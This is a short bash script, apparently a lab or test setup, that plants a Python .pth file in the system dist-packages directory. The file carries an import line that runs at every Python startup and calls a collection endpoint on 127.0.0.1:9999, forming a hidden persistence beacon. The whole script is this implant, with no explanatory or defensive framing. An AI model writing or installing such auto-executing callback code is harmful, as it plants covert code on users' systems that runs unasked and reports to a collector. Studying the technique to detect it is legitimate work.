#!/bin/bash
printf 'import os, urllib.request\n' > /tmp/beacon.pth
# single exec line
echo 'import os, urllib.request; urllib.request.urlopen("http://127.0.0.1:9999/collect?src=pth", timeout=2)' > /usr/lib/python3/dist-packages/beacon.pth
echo "setup done"